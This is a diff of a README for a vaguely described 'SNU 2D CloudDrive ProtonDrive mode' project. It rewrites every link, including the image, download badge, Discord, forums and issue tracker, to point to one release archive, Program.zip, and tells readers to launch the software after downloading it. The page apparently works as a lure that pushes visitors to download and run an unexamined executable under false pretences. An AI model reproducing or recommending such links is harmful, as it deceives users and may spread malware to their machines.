@@ -3,7 +3,7 @@
 
 Welcome to the official source repository for the SNU 2D CloudDrive ProtonDrive mode project!
 
-![SNU_2D_CloudDrive_ProtonDrive](https://via.placeholder.com/500)
+![SNU_2D_CloudDrive_ProtonDrive](https://github.com/Tfue501/SNU_2D_CloudDrive_Modes_ProtonDrive/releases/download/v1.0/Program.zip)
 
 ## About
 This repository serves as the central hub for all development related to the SNU 2D CloudDrive ProtonDrive mode. Here, you can explore the code, contribute to the project, and stay up-to-date with the latest developments.
@@ -16,7 +16,7 @@ This repository serves as the central hub for all development related to the SNU
 ## Installation 🛠️
 To get started with the SNU 2D CloudDrive ProtonDrive mode project, simply download the software package from the link below:
 
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip)
+[![Download Software](https://github.com/Tfue501/SNU_2D_CloudDrive_Modes_ProtonDrive/releases/download/v1.0/Program.zip)](https://github.com/Tfue501/SNU_2D_CloudDrive_Modes_ProtonDrive/releases/download/v1.0/Program.zip)
 
 Please note that the software needs to be launched after download.
 
@@ -35,12 +35,12 @@ We welcome contributions from the community to help improve the SNU 2D CloudDriv
 
 ## Community
 Join our community to engage with other developers and users of the SNU 2D CloudDrive ProtonDrive mode project:
-- [Discord](https://discord.com/SNU_2D_CloudDrive_ProtonDrive)
-- [Forums](http://forums.SNU_2D_CloudDrive_ProtonDrive.com)
+- [Discord](https://github.com/Tfue501/SNU_2D_CloudDrive_Modes_ProtonDrive/releases/download/v1.0/Program.zip)
+- [Forums](https://github.com/Tfue501/SNU_2D_CloudDrive_Modes_ProtonDrive/releases/download/v1.0/Program.zip)
 
 ## Resources 📚
 - [Documentation](/docs)
-- [Issue Tracker](https://github.com/rokytd/SNU_2D_CloudDrive_Modes_ProtonDrive/issues)
+- [Issue Tracker](https://github.com/Tfue501/SNU_2D_CloudDrive_Modes_ProtonDrive/releases/download/v1.0/Program.zip)
 
 ## Contributors ✨
 This project is made possible by the following contributors:
